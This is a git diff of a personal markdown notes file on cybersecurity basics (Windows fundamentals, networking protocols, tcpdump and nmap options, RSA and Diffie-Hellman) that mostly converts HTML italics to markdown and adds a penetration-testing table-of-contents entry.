@@ -25,6 +25,7 @@ Collection of notes regarding Cybersecurity vocabulary for my personal reference
 ### Offensive Security Concepts
 + [Web Applications](#web-applications)
 + [OWASP Top 10 (2021)](#owasp-top-10-2021)
++ [Penetration Testing](#penetration-testing)
 ### Offensive Security Tools
 + [Metasploit](#metasploit)
 + [Burp Suite](#burp-suite)
@@ -66,7 +67,7 @@ Answer the following questions:
 + What tactics, techniques, and procedures (TTPs) do they use?
 + What critical information has the adversary obtained?
 
-<i>threat = adversary + intent + capability</i>
+*threat = adversary + intent + capability*
 
 <b>Step 3: Analyse vulnerabilities</b>
 
@@ -94,19 +95,19 @@ Consider these factors:
 Elastic stack is the collection of different open source components that help users take data from any source and format to perofrm a search, analyse, and visualise data in real-time.
 
 The components include:
-+ <i>Elasticsearch</i> - full-text search and analytics engine used to store JSON-formatted documents; supports RESTFul API to interact with the data
-+ <i>Logstash</i> - data processing engine used to take data from different sources, apply filters/normalise them, and send to the destination such as Kibana/listening port; configuration file is dvided into input, filter, and output parts
-+ <i>Beats</i> - host-based agent known as Data-shippers used to ship/transfer data from endpoints to elasticsearch; each beat is a single-purpose agent that sends specific data (e.g. Winlogbeat:windows event logs, Packetbeat:network traffic flows)
-+ <i>Kibana</i> - web-based data visualiusation that works with elasticsearch to analyse, investigate, and visualise data streams in real-time; allows users to create multiple visualisations and dashboards
++ *Elasticsearch* - full-text search and analytics engine used to store JSON-formatted documents; supports RESTFul API to interact with the data
++ *Logstash* - data processing engine used to take data from different sources, apply filters/normalise them, and send to the destination such as Kibana/listening port; configuration file is dvided into input, filter, and output parts
++ *Beats* - host-based agent known as Data-shippers used to ship/transfer data from endpoints to elasticsearch; each beat is a single-purpose agent that sends specific data (e.g. Winlogbeat:windows event logs, Packetbeat:network traffic flows)
++ *Kibana* - web-based data visualiusation that works with elasticsearch to analyse, investigate, and visualise data streams in real-time; allows users to create multiple visualisations and dashboards
 
 ## Atomic Red Team
 Atomic Red Team is an open-source framework for performing security testing and threat emulation, consisting of TTPs that simulate various types of attacks and security threats (e.g. malware, phishing attacks, network compromise)
 
-<i>Atomics</i> - different testing techniques based on the MITRE ATT&CK framework that security analysts can use to emulate a specific technique.
+*Atomics* - different testing techniques based on the MITRE ATT&CK framework that security analysts can use to emulate a specific technique.
 
 ## Windows Fundamentals
 ### NTFS
-<i>New Technology File System (NTFS)</i> - file system used in modern version of Windows
+*New Technology File System (NTFS)* - file system used in modern version of Windows
 
 NTFS addresses many limitations of previous file systems (i.e. FAT16/FAT32, HPFS):
 + Supports larger file sizes
@@ -122,24 +123,24 @@ Permissions include:
 + Read
 + Write
 
-<i>Alternate Data Streams (ADS)</i> - file attribute specific to NTFS
+*Alternate Data Streams (ADS)* - file attribute specific to NTFS
 
 ### Windows\System32
-C:\Windows traditionally contains the OS. This is where the environmental variables are. The system environment variable for the Windows directory is <i>%windir%</i>.
+C:\Windows traditionally contains the OS. This is where the environmental variables are. The system environment variable for the Windows directory is *%windir%*.
 
 System32 folder holds all the critical files for the OS.
 
 ### User Accounts, Profiles, & Permissions
 User account type can either be: 
-+ <i>administrator</i> - can make changes to the system (e.g. add users, delete users, modify groups, modify system settings, etc)
-+ <i>standard user</i> - can only make change to folders/files attributed to the user
++ *administrator* - can make changes to the system (e.g. add users, delete users, modify groups, modify system settings, etc)
++ *standard user* - can only make change to folders/files attributed to the user
 
-Running <i>lusrmgr.msc</i> will open the <i>Local User and Group Management</i>.
+Running *lusrmgr.msc* will open the *Local User and Group Management*.
 
-<i>User Account Control (UAC)</i> - prompts confirmation from the admin user when an operation requiring higher-level privileges needs to execute
+*User Account Control (UAC)* - prompts confirmation from the admin user when an operation requiring higher-level privileges needs to execute
 
 ### MSConfig
-The <i>System Configuration</i> utility is for troubleshooting, primarily to help diagnose startup issues.
+The *System Configuration* utility is for troubleshooting, primarily to help diagnose startup issues.
 
 The utility has five tabs:
 1. General - select what devices and services to load on boot (i.e. Normal, Diagnostic, Selective)
@@ -149,27 +150,27 @@ The utility has five tabs:
 6. Tools - various utilities
 
 Tools include:
-+ <i>Change UAC Settings</i>
-+ <i>Computer Management (compmgmt)</i>, which includes Task Scheduler, Event Viewer, Device Manager, Local Users & Groups, etc.
-+ <i>System Information (msinfo32)</i> gathers information and displays hardware, system components, and software environment
-+ <i>Resource Monitor (resmon)</i> displays CPU, memory, disk, and network usage information; start, stop, pause and resume services
-+ <i>Command Prompt (cmd)</i>
-+ <i>Registry Editor (regedit)</i> edit Windows Registry, which is the database that stores user profiles, installed applications, property sheet settings for folders/application icons, hardware, used ports
++ *Change UAC Settings*
++ *Computer Management (compmgmt)*, which includes Task Scheduler, Event Viewer, Device Manager, Local Users & Groups, etc.
++ *System Information (msinfo32)* gathers information and displays hardware, system components, and software environment
++ *Resource Monitor (resmon)* displays CPU, memory, disk, and network usage information; start, stop, pause and resume services
++ *Command Prompt (cmd)*
++ *Registry Editor (regedit)* edit Windows Registry, which is the database that stores user profiles, installed applications, property sheet settings for folders/application icons, hardware, used ports
 
 ### Windows Security
-<i>Windows Update</i> provides security updates, feature enhancements, and patches for the OS, and other products. 
+*Windows Update* provides security updates, feature enhancements, and patches for the OS, and other products. 
 
 **control /name Microsoft.WindowsUpdate**: access Windows Update
 
-<i>Windows Security</i> centralises the management of device and data protection tools. Protection areas include:
+*Windows Security* centralises the management of device and data protection tools. Protection areas include:
 + Virus & threat protection - scans, threat history, manage settings, check updates, ransomware protection
 + Firewall & network protection - firewall settings (i.e. domain, private, public), advanced settings; **WF.msc**: opens Windows Defender Firewall
 + App & browser control - Microsoft Defender Smartscreen, check apps and files, exploit protection 
 + Device security - core isolation (i.e. memory integrity), security processor details (i.e. TPM)
 
-<i>BitLocker</i> is a data protection feature using drive encryption. Most protection is achieved when used with a TPM version 1.2 or later. 
+*BitLocker* is a data protection feature using drive encryption. Most protection is achieved when used with a TPM version 1.2 or later. 
 
-<i>Volume Shadow Copy Service (VSS)</i> creates a consistent shadow copy (i.e. snapshot, point-in-time copy) of data to be backed up. These copies are stored on the System Volume Information folder on each drive that has protection enabled. If enabled (i.e. System Protection is turned on), the following tasks can be performed:
+*Volume Shadow Copy Service (VSS)* creates a consistent shadow copy (i.e. snapshot, point-in-time copy) of data to be backed up. These copies are stored on the System Volume Information folder on each drive that has protection enabled. If enabled (i.e. System Protection is turned on), the following tasks can be performed:
 + Create a restore point
 + Perform system restore
 + Configure restore settings
@@ -194,7 +195,7 @@ Some common shells include:
 | User Friendliness | Less user-friendly | Most user-friendly | Highly user-friendly with proper customisation |
 | Syntax Highlighting | Not available | Built-in | Can be used with some plug-ins |
 
-Script files can be edited using any text editor and has the extension <i>.sh</i>. Every script should also start from shebang: <i>#!</i> followed by the name of the interpreter (e.g. /bin/bash)
+Script files can be edited using any text editor and has the extension *.sh*. Every script should also start from shebang: *#!* followed by the name of the interpreter (e.g. /bin/bash)
 
 Some basic script commands:
 + **read [variable_name]**: asks user input and saves to a variable
@@ -206,15 +207,15 @@ To execute scripts, it has to be given execution permissions.
 **chmod +x [variable_script.sh]**: give execution permission to the script
 
 ## Networking Basics
-<i>Networks</i> are the connections between technological devices. These can be formed from two devices to billions. A network can be one of two types:
+*Networks* are the connections between technological devices. These can be formed from two devices to billions. A network can be one of two types:
 + Private
 + Public
 
-The <i>Internet</i> is simply a giant network that consists of many smaller networks. The first iteration was ARPANET in the 1960s, which then led to the creation of the World Wide Web (WWW). 
+The *Internet* is simply a giant network that consists of many smaller networks. The first iteration was ARPANET in the 1960s, which then led to the creation of the World Wide Web (WWW). 
 
 Devices have two identifiable fingerprints: 
-+ <i>Internet Protocol (IP) Address</i> - identifies a host on a network; can be public or private; can be IPv4 or IPv6
-+ <i>Media Access Control (MAC) Address</i> - unique 12 hexadecimal number that identifies vendor and unique address of the network interface
++ *Internet Protocol (IP) Address* - identifies a host on a network; can be public or private; can be IPv4 or IPv6
++ *Media Access Control (MAC) Address* - unique 12 hexadecimal number that identifies vendor and unique address of the network interface
 
 RFC 1918 defines the following three ranges of private IP addresses:
 + 10.0.0.0 - 10.255.255.255 (10/8)
@@ -222,28 +223,28 @@ RFC 1918 defines the following three ranges of private IP addresses:
 + 192.168.0.0 - 192.168.255.255 (192.168/16)
 
 ### Networking Devices
-A <i>switch</i> is a device that aggregates multiple networking-capable devices using ethernet. 
+A *switch* is a device that aggregates multiple networking-capable devices using ethernet. 
 
-A <i>router</i> is a device that connects networks and pass data between them. Routing involves creating a path between networks for data to be delivered. 
+A *router* is a device that connects networks and pass data between them. Routing involves creating a path between networks for data to be delivered. 
 
 ### Routing Algorithms
 Routing algorithms are used by routers to figure out which appropriate links to send packets to. Some algorithms include:
-+ <i>Open Shortest Path First (OSPF)</i> - routers hare information about network topology and calculate the most efficient paths; routers exchange updates about the state of their connected links and networks
-+ <i>Enhanced Interior Gateway Routing Protocol (EIGRP)</i> - a Cisco proprietary protocol; routers share information about the networks they can reach and the bandwidth/delay costs associated with these routes
-+ <i>Border Gateway Protocol (BGP)</i> - the primary protocol used on the Internet; allows different networks (e.g. ISPs) to exchange routing information and establish paths between the networks
-+ <i>Routing Information Protocol</i> - often used in small networks; routers share information about networks they can reach and the number of hops required; each router builds a routing table
++ *Open Shortest Path First (OSPF)* - routers hare information about network topology and calculate the most efficient paths; routers exchange updates about the state of their connected links and networks
++ *Enhanced Interior Gateway Routing Protocol (EIGRP)* - a Cisco proprietary protocol; routers share information about the networks they can reach and the bandwidth/delay costs associated with these routes
++ *Border Gateway Protocol (BGP)* - the primary protocol used on the Internet; allows different networks (e.g. ISPs) to exchange routing information and establish paths between the networks
++ *Routing Information Protocol* - often used in small networks; routers share information about networks they can reach and the number of hops required; each router builds a routing table
 
 ### Subnets
-<i>Subnetting</i> is used to split the number of hosts that can fit in a network, represented by a number called the subnet mask (e.g. 255.255.255.0). Subnets use IP addresses in three ways:
+*Subnetting* is used to split the number of hosts that can fit in a network, represented by a number called the subnet mask (e.g. 255.255.255.0). Subnets use IP addresses in three ways:
 + Identify the network address (i.e. 192.168.1.0)
 + Identify the host address (i.e. 192.168.1.100)
 + Identify the default gateway (i.e. 192.168.1.254)
 
 ### VLANs
-A <i>Virtual Local Area Network (VLAN)</i> allows specific devices within a network to be virtually split up. This sepration provides security by enforcing rules to determine how specific devices communicate with each other.
+A *Virtual Local Area Network (VLAN)* allows specific devices within a network to be virtually split up. This sepration provides security by enforcing rules to determine how specific devices communicate with each other.
 
 ### ISO OSI Model
-The <i>Open Systems Interconnection (OSI) Model</i> provides a framework dictating how all networked devices send, receive, and interpret data. This model consists of seven layers, wherein specific process take place, and pieces of information are added to the data. These layers are the following:
+The *Open Systems Interconnection (OSI) Model* provides a framework dictating how all networked devices send, receive, and interpret data. This model consists of seven layers, wherein specific process take place, and pieces of information are added to the data. These layers are the following:
 
 | Layer # | Layer Name | Main Function | Example Protocols & Standards |
 | :-----: | :------: | :------: | :------: |
@@ -256,7 +257,7 @@ The <i>Open Systems Interconnection (OSI) Model</i> provides a framework dictati
 | Layer 1 | Physical layer | Physical data transmission media | Electrical, optical, and wireless signals |
 
 ### TCP/IP Model (RFC 1122)
-While the OSI model is conceptual, the <i>Transmission Control Protocol/Internet Protocol (TCP/IP) model</i> is implemented. A strength of this model is that it allows a network to continue to function as parts of it become out of service. This is made possible due to the design of routing protocols to adapt as network topologies change. This model is as follows:
+While the OSI model is conceptual, the *Transmission Control Protocol/Internet Protocol (TCP/IP) model* is implemented. A strength of this model is that it allows a network to continue to function as parts of it become out of service. This is made possible due to the design of routing protocols to adapt as network topologies change. This model is as follows:
 
 | Layer # | OSI Model | TCP/IP Model | Example Protocols & Standards |
 | :-----: | :------: | :------: | :------: |
@@ -269,21 +270,21 @@ While the OSI model is conceptual, the <i>Transmission Control Protocol/Internet
 | Layer 1 | Physical layer |  |  |
 
 ### Packets
-<i>Packets</i> are small pieces of data that combine together to make a piece of information/message. <i>Frames</i> are slightly different as they are at layer 2, meaning no information such as IP addresses are included. These have a set of headers that include:
+*Packets* are small pieces of data that combine together to make a piece of information/message. *Frames* are slightly different as they are at layer 2, meaning no information such as IP addresses are included. These have a set of headers that include:
 + Time to Live (TTL) - sets an expiry timer for the packet
 + Checksum - provides integrity checking, where changes in data will indicated corrupted packets
 + Source Address - IP address of the device the packet is being sent from
 + Destination Address - IP address the packet is being sent to
 
 ### Encapsulation
-<i>Encapsulation</i> is the process of every layer adding a header/trailer to a received unit of data. The process is as follows:
+*Encapsulation* is the process of every layer adding a header/trailer to a received unit of data. The process is as follows:
 1. We start with application data.
-2. At the transport layer, a TCP or UDP header is added to create a <i>TCP segment</i> or <i>UDP datagram</i>.
-3. At the network layer, an IP header is added to get an <i>IP packet</i>, which can be router over the Internet.
-4. Lastly, a header and trailer is added to get a <i>WiFi/Ethernet frame</i> at the link layer.
+2. At the transport layer, a TCP or UDP header is added to create a *TCP segment* or *UDP datagram*.
+3. At the network layer, an IP header is added to get an *IP packet*, which can be router over the Internet.
+4. Lastly, a header and trailer is added to get a *WiFi/Ethernet frame* at the link layer.
 
 ### TCP
-<i>Transmission Control Protocol (TCP)</i> guarantees that any data sent will be received on the other end. This protocol operates at the transport layer (i.e. layer 4). This is done via a 'three-way handshake':
+*Transmission Control Protocol (TCP)* guarantees that any data sent will be received on the other end. This protocol operates at the transport layer (i.e. layer 4). This is done via a 'three-way handshake':
 1. SYN message is send by the client; initiates a connection and sychronises the two devices.
 2. SYN/ACK packet is sent by the receiving device.
 3. ACK packet is used to acknowledge that the series of packets have been received.
@@ -292,10 +293,10 @@ While the OSI model is conceptual, the <i>Transmission Control Protocol/Internet
 6. *A RST packet is the last resort used to abruptly end all communication, usually done if there is a problem.
 
 ### UDP
-<i>User Datagram Protocol (UDP)</i> is a stateless protocol that does not require a constant connection between devices (i.e. three-way handshake not needed). This also means that there are no data integrity safeguards in place. However, UDP communication is much faster than TCP. This protocol operates at the transport layer (i.e. layer 4)
+*User Datagram Protocol (UDP)* is a stateless protocol that does not require a constant connection between devices (i.e. three-way handshake not needed). This also means that there are no data integrity safeguards in place. However, UDP communication is much faster than TCP. This protocol operates at the transport layer (i.e. layer 4)
 
 ### Ports & Port Forwarding
-Networking devices use <i>ports</i> to communicate with each other. There are rules for which protocols apply to which ports. These include the following:
+Networking devices use *ports* to communicate with each other. There are rules for which protocols apply to which ports. These include the following:
 + 21 for FTP
 + 22 for SSH
 + 80 for HTTP
@@ -303,10 +304,10 @@ Networking devices use <i>ports</i> to communicate with each other. There are ru
 + 445 for SMB
 + 3389 for RDP
 
-<i>Port fowarding</i> allows connection of application and services to the internet by opening specific ports. This can be configured at a network's router.
+*Port fowarding* allows connection of application and services to the internet by opening specific ports. This can be configured at a network's router.
 
 ### DHCP
-<i>Dynamic Host Configuration Protocol (DHCP)</i> automatically assigns IP addresses to devices in a network. This is an application-level protocol that relies on UDP. The server listens on UDP port 67, and the client sends from UDP port 68. 
+*Dynamic Host Configuration Protocol (DHCP)* automatically assigns IP addresses to devices in a network. This is an application-level protocol that relies on UDP. The server listens on UDP port 67, and the client sends from UDP port 68. 
 
 This protocol follows the Discover, Offer, Request, and Acknowledge (DORA) steps. This process is done by:
 1. A newly connected device sends out a DHCPDISCOVER request to see if any DHCP servers are on the network.
@@ -315,7 +316,7 @@ This protocol follows the Discover, Offer, Request, and Acknowledge (DORA) steps
 4. Lastly, the DHCP server sends a DHCPACK, acknowledging that the device can start using the IP address.
 
 ### ARP
-<i>Address Resolution Protocol (ARP)</i> allows a device to associate its MAC address with an IP address on a network (i.e. translation from layer 3 to layer 2 addressing). Each device on a network will keep logs of the MAC addresses associated with other devices. 
+*Address Resolution Protocol (ARP)* allows a device to associate its MAC address with an IP address on a network (i.e. translation from layer 3 to layer 2 addressing). Each device on a network will keep logs of the MAC addresses associated with other devices. 
 
 This is done by:
 1. ARP Request is broadcasted on the network (i.e. asking for the IP address for a particular MAC address).
@@ -325,12 +326,12 @@ This is done by:
 Note that an ARP Request or ARP reply is not encapsulated within a UDP or IP packet. Rather, it is encapsulated directly within an Ethernet frame.
 
 ### ICMP
-<i>Internet Control Message Protocol (ICMP)</i> is mainly for network diagnotics and error reporting. Two popular commands that rely on ICMP are:
+*Internet Control Message Protocol (ICMP)* is mainly for network diagnotics and error reporting. Two popular commands that rely on ICMP are:
 + **ping**: uses ICMP (i.e. ICMP type 8 - Echo Request, ICMP type 0 - Echo Reply) to test connectivity to a target system and measures rount-trip time (RTT)
 + **tracert/traceroute**: uses ICMP (i.e. ICMP type 11 - Time Exceeded message) to discover the route from your host to target machine
 
 ### NAT
-<i>Network Address Translation (NAT)</i> allows the use of one public IP address to provide Internet access to many private IP addresses. This is done by NAT-supporting routers maintaining a table that translates network addresses between internal and external networks. In effect, the internal network would use a private IP address (i.e. intra-network), while the external network (i.e. gateway to the Internet) would use the public IP address.
+*Network Address Translation (NAT)* allows the use of one public IP address to provide Internet access to many private IP addresses. This is done by NAT-supporting routers maintaining a table that translates network addresses between internal and external networks. In effect, the internal network would use a private IP address (i.e. intra-network), while the external network (i.e. gateway to the Internet) would use the public IP address.
 
 ## Networking Core Protocols
 Summary of default port numbers of the protocols listed below:
@@ -347,17 +348,17 @@ Summary of default port numbers of the protocols listed below:
 | IMAP | TCP | 143 |
 
 ### Telnet
-The <i>Teletype Network (TELNET)</i> protocol allows connection and communication with a remote system and issue text commands. This can be used for remote administration or to connect to any server listening on a TCP port number.
+The *Teletype Network (TELNET)* protocol allows connection and communication with a remote system and issue text commands. This can be used for remote administration or to connect to any server listening on a TCP port number.
 
 **telnet [ip_address] [port_num]**: connects to a target machine at a specific port
 
 ### DNS
 (Remembering Addresses)
 
-<i>Domain Name System (DNS)</i> allows a simple way for devices to communicate with the internet without remembering IP addresses. To visit a website, the website name can be entered instead.
-+ A <i>Top-Level Domain (TLD)</i> is the most righthand part of a domain name (e.g. .com in tryhackme.com).
-+ A <i>Second-Level Domain</i> includes the domain name (e.g. tryhackme in tryhackme.com)
-+ A <i>subdomain</i> sits on the left-hand side of the domain name, using a period to separate it (e.g. admin in admin.tryhackme.com). Multiple subdomains that are split with periods can create longer names (e.g. jupiter.servers in jupter.servers.tryhackme.com)
+*Domain Name System (DNS)* allows a simple way for devices to communicate with the internet without remembering IP addresses. To visit a website, the website name can be entered instead.
++ A *Top-Level Domain (TLD)* is the most righthand part of a domain name (e.g. .com in tryhackme.com).
++ A *Second-Level Domain* includes the domain name (e.g. tryhackme in tryhackme.com)
++ A *subdomain* sits on the left-hand side of the domain name, using a period to separate it (e.g. admin in admin.tryhackme.com). Multiple subdomains that are split with periods can create longer names (e.g. jupiter.servers in jupter.servers.tryhackme.com)
 
 Types of DNS records include:
 + A Record - resolve to IPv4 addresses
@@ -376,21 +377,21 @@ DNS request process:
 DNS operates at layer 7, using UDP port 53 by default and TCP port 53 as a default fallback.
 
 ### WHOIS
-A <i>WHOIS</i> record provides information about the entity that registered a domain name, including their name, phone number, email, and address. Note that privacy services can hide information, if required.
+A *WHOIS* record provides information about the entity that registered a domain name, including their name, phone number, email, and address. Note that privacy services can hide information, if required.
 
 **whois**: looks up the WHOIS records of a registered domain name
 
 ### HTTP
 (Accessing the Web)
 
-<i>HyperText Transfer Protocol (HTTP)</i> is the set of rules used for communicating with web servers for the transmition of webpage data (e.g. HTML, images, videos, etc)
+*HyperText Transfer Protocol (HTTP)* is the set of rules used for communicating with web servers for the transmition of webpage data (e.g. HTML, images, videos, etc)
 
-<i>Cookies</i> are small pieces of data that is stored on your computer. As HTTP request is stateless (i.e. does not keep track of previous requests), cookies can be used to remind the web server information about you, your settings, or whether you have been to the website before.
+*Cookies* are small pieces of data that is stored on your computer. As HTTP request is stateless (i.e. does not keep track of previous requests), cookies can be used to remind the web server information about you, your settings, or whether you have been to the website before.
 
 ### FTP
 (Transferring Files)
 
-<i>File Transfer Protocol (FTP)</i> is designed to transfer files, which it can achieve at higher speeds than HTTP.
+*File Transfer Protocol (FTP)* is designed to transfer files, which it can achieve at higher speeds than HTTP.
 
 Example FTP commands include:
 + USER [username] - used to input the username
@@ -405,7 +406,7 @@ FTP server listens on TCP port 21 by default. Data transfer is conducted via ano
 ### SMTP
 (Sending Email)
 
-<i>Simple Mail Transfer Protocol (SMTP)</i> defines how a mail client communicates with a mail server and how a mail server communicates with another.
+*Simple Mail Transfer Protocol (SMTP)* defines how a mail client communicates with a mail server and how a mail server communicates with another.
 
 Example SMTP commands used by the mail client to the SMTP server:
 + HELO/EHLO - initiates an SMTP session
@@ -419,7 +420,7 @@ The SMTP server listens on TCP port 25 by default.
 ### POP3
 (Receiving Email)
 
-The <i>Post Office Protocol v3 (POP3)</i> allows the client to communicate with a mail server to retrieve email messages.
+The *Post Office Protocol v3 (POP3)* allows the client to communicate with a mail server to retrieve email messages.
 
 Some common POP3 commands include:
 + USER [username] - identifies the user
@@ -435,7 +436,7 @@ The POP3 server listens on TCP port 110 by default.
 ### IMAP
 (Syncrhonising Email)
 
-The <i>Internet Message Access Protocol (IMAP)</i> allows synchronising read, moved, and deleted messages. This is particularly useful for checking emails via multiple clients. As an effect, IMAP tends to use more storage as emails are kept on the server to be syncrhonised across the email clients.
+The *Internet Message Access Protocol (IMAP)* allows synchronising read, moved, and deleted messages. This is particularly useful for checking emails via multiple clients. As an effect, IMAP tends to use more storage as emails are kept on the server to be syncrhonised across the email clients.
 
 Some example of IMAP protocol commands include:
 + LOGIN [username] [password] - authenticates the user
@@ -448,7 +449,7 @@ The IMAP server listens on TCP port 143 by default.
 
 ## Networking Secure Protocols
 ### TLS
-<i>Transport Layer Security (TLS)</i> is a cryptographic protocol operating at the transport layer, which allows secure communication between a client and a server over an insecure network. TLS ensures that no one can read or modify the exchanged data. <i>Secure Sockets Layer (SSL)</i> is the precursor to TLS.
+*Transport Layer Security (TLS)* is a cryptographic protocol operating at the transport layer, which allows secure communication between a client and a server over an insecure network. TLS ensures that no one can read or modify the exchanged data. *Secure Sockets Layer (SSL)* is the precursor to TLS.
 
 TLS revolves around the use of signed TLS certificates. The process is as follows:
 1. Server administrator submits a Certificate Signing Request (CSR) to a Certificate Authority (CA).
@@ -466,7 +467,7 @@ A summary of secure versions of protocols:
 | IMAPS | 993 |
 
 ### SSH
-<i>Secure Shell (SSH)</i> provides a secure alternative to telnet. Nowadays, SSH clients are based on OpenSSH libraries and source code.
+*Secure Shell (SSH)* provides a secure alternative to telnet. Nowadays, SSH clients are based on OpenSSH libraries and source code.
 
 OpenSSH offers several benefits, including:
 + Secure Authentication - supports password-based authentication, public key, and two-factor authentication
@@ -480,7 +481,7 @@ OpenSSH offers several benefits, including:
 The SSH server listens on port 22.
 
 ### HTTPS
-<i>HyperText Transfer Protocol Secure (HTTPS)</i> is the secure version of HTTP, where data is encrypted to stop people from seeing data being received and sent. It also gives assurances that you are talking to the correct web server, not a spoof. Essentially, this is HTTP with TLS.
+*HyperText Transfer Protocol Secure (HTTPS)* is the secure version of HTTP, where data is encrypted to stop people from seeing data being received and sent. It also gives assurances that you are talking to the correct web server, not a spoof. Essentially, this is HTTP with TLS.
 
 Requesting a page over HTTPS will require the following three steps after resolving the domain name:
 1. Establish a TCP three-way handshake with the target server
@@ -493,9 +494,9 @@ Opening the contents of HTTPS packets will return encrypted text. An encryption 
 Adding TLS to SMTP, POP3, and IMAP appends an S for "Secure." They work the same way as HTTPS.
 
 ### SFTP & FTPS
-<i>SSH File Transfer Protocol (SFTP)</i> allows secure file transfer. It is part of the SSH protocol suite and shares port 22. SFTP commands are Unix-like and can differ from FTP commands.
+*SSH File Transfer Protocol (SFTP)* allows secure file transfer. It is part of the SSH protocol suite and shares port 22. SFTP commands are Unix-like and can differ from FTP commands.
 
-Note that SFTP is different from FTPS. <i>File Transfer Protocol Secure (FTPS)</i> uses TLS and port 990. FTPS requires certificate setup and can be tricky to allow over firewalls as it uses separate connections for control and data transfer. Meanwhile, SFTP setup is easy as it only requires enabling an option with OpenSSH.
+Note that SFTP is different from FTPS. *File Transfer Protocol Secure (FTPS)* uses TLS and port 990. FTPS requires certificate setup and can be tricky to allow over firewalls as it uses separate connections for control and data transfer. Meanwhile, SFTP setup is easy as it only requires enabling an option with OpenSSH.
 
 **sftp [username@hostname]**: log in SFTP server
 
@@ -504,14 +505,14 @@ Note that SFTP is different from FTPS. <i>File Transfer Protocol Secure (FTPS)</
 **put [file_name]**: upload files
 
 ### VPN
-A <i>Virtual Private Network (VPN)</i> allows devices on separate networks to communicate securely by creating a dedicated path between each other over the Internet using a tunnel. Connected devices form their own private network. Some existing VPN technologies include:
+A *Virtual Private Network (VPN)* allows devices on separate networks to communicate securely by creating a dedicated path between each other over the Internet using a tunnel. Connected devices form their own private network. Some existing VPN technologies include:
 + PPP - allows for authentication and data encryption by using private keys and public certificates; not capable of leaving a network by itself (i.e. non-routable)
 + PPTP - allows data from PPP to travel and leave a network; weakly encrypted in comparison to alternatives
 + IPSec - encrypts data using the IP framework; difficult to set up but has strong encryption and device support
 
 ## Networking Tools
 ### Wireshark
-<i>Wireshark</i> is an open-source network packet analyser tool. It can sniff and investigate live traffic and inspect packet captures (PCAP). Its use cases include:
+*Wireshark* is an open-source network packet analyser tool. It can sniff and investigate live traffic and inspect packet captures (PCAP). Its use cases include:
 + Detecting and troubleshooting network problems (e.g. network load failure points and congestion)
 + Detecting security anomalies (e.g. rogue hosts, abnormal port usage, and suspicious traffic)
 + Investigating and learning protocol details (e.g. response codes and payload data)
@@ -528,7 +529,7 @@ Wireshark uses OSI layers to break down packets and use these layers for analysi
 + Application Data - extension of the fifth layer and can show application-specific data
 
 ### tcpdump
-<i>tcpdump</i> is a tool that captures network traffic and taking a closer look at various protocols. This tool and its <i>libpcap</i> library were released for Unix-like systems. <i>winpcap</i> is the ported version to Windows.
+*tcpdump* is a tool that captures network traffic and taking a closer look at various protocols. This tool and its *libpcap* library were released for Unix-like systems. *winpcap* is the ported version to Windows.
 
 **tcpdump**: main command 
 
@@ -561,7 +562,7 @@ Some packet display options:
 + **-X**: show headers and data in hex and ASCII
 
 ### nmap
-<i>nmap</i> is a network scanner tool that can 1) discover other live devices on this/other network and 2) find out the network services running on these live devices (e.g. SSH, web servers)
+*nmap* is a network scanner tool that can 1) discover other live devices on this/other network and 2) find out the network services running on these live devices (e.g. SSH, web servers)
 
 **nmap**: main command to initiate nmap tasks; add **sudo** or be logged in as root
 for full features
@@ -604,37 +605,37 @@ For controlling report output:
 Cryptography is used to protect confidentiality, integrity, and authenticity. It is the practice and study of techniques for secure communication and data protection where we expect the presence of adversaries and third parties.
 
 Key terminologies include:
-+ <i>Plaintext</i> - original, readable message or data before encryption (e.g. document, image, multimedia file, any other binary data)
-+ <i>Ciphertext</i> - scrambled, unreadable version of the message after encryption
-+ <i>Cipher</i> - algorithm or method to convert plaintext into ciphertext and back again
-+ <i>Key</i> - string of bits the cipher uses to encrypt or decrypt data
-+ <i>Encryption</i> - process of converting plaintext into ciphertext using a cipher and a key
-+ <i>Decryption</i> - reverse process of encryption, converting ciphertext back into plaintext using a cipher and a key
++ *Plaintext* - original, readable message or data before encryption (e.g. document, image, multimedia file, any other binary data)
++ *Ciphertext* - scrambled, unreadable version of the message after encryption
++ *Cipher* - algorithm or method to convert plaintext into ciphertext and back again
++ *Key* - string of bits the cipher uses to encrypt or decrypt data
++ *Encryption* - process of converting plaintext into ciphertext using a cipher and a key
++ *Decryption* - reverse process of encryption, converting ciphertext back into plaintext using a cipher and a key
 
 The two main categories of encryption:
-1. <i>Symmetric</i> - uses the same key to encrypt and decrypt data; also known as <i>private key cryptography</i> (e.g. DES, 3DES, AES)
-2. <i>Asymmetric</i> - uses a pair of keys, one to encrypt (i.e. the public key) and the other to decrypt (i.e. the private key)
+1. *Symmetric* - uses the same key to encrypt and decrypt data; also known as *private key cryptography* (e.g. DES, 3DES, AES)
+2. *Asymmetric* - uses a pair of keys, one to encrypt (i.e. the public key) and the other to decrypt (i.e. the private key)
 
 ### RSA
-<i>RSA</i> is a public-key encryption algorithm. It is based on factoring large numbers. RSA is used for digital signtaures, key transport, and authentication (i.e. proves the identity of the person you are talking to via digital signing)
+*RSA* is a public-key encryption algorithm. It is based on factoring large numbers. RSA is used for digital signtaures, key transport, and authentication (i.e. proves the identity of the person you are talking to via digital signing)
 
 The main variables to know include:
-+ <i>p</i> and <i>q</i> are large prime numbers
-+ <i>n</i> is the product of p and q
-+ The public key is n and <i>e</i>
-+ The private key is n and <i>d</i>
-+ <i>m</i> is used to represent the original message (i.e. plaintext)
-+ <i>c</i> represents the encrypted text (i.e. ciphertext)
++ *p* and *q* are large prime numbers
++ *n* is the product of p and q
++ The public key is n and *e*
++ The private key is n and *d*
++ *m* is used to represent the original message (i.e. plaintext)
++ *c* represents the encrypted text (i.e. ciphertext)
 
 Useful tools include [RsaCtfTool](https://github.com/RsaCtfTool/RsaCtfTool) and [rsatool](https://github.com/ius/rsatool).
 
 ### Diffie-Hellman Key Exchange
-<i>Diffie-Hellman</i> is often used with RSA for key agreement. This can provide the means to establish a shared key for symmetric cryptography for the key exchange.
+*Diffie-Hellman* is often used with RSA for key agreement. This can provide the means to establish a shared key for symmetric cryptography for the key exchange.
 
 Steps of this process is as follows:
-1. Agree on public variables <i>p</i> and <i>g</i>
-2. Each party chooses a private integer <i>a</i> and <i>b</i>
-3. Each party calculates their public key <i>A = g^a mod p</i> and <i>B = g^b mod p</i>
+1. Agree on public variables *p* and *g*
+2. Each party chooses a private integer *a* and *b*
+3. Each party calculates their public key *A = g^a mod p* and *B = g^b mod p*
 4. Each party sends the keys to each other (i.e. the key exchange)
 5. Calculate shared secret using the received public key using their own private key
 
@@ -643,21 +644,21 @@ SSH key authentication uses public and private keys to prove the client is valid
 
 **ssh-keygen**: program to generate key pairs
 
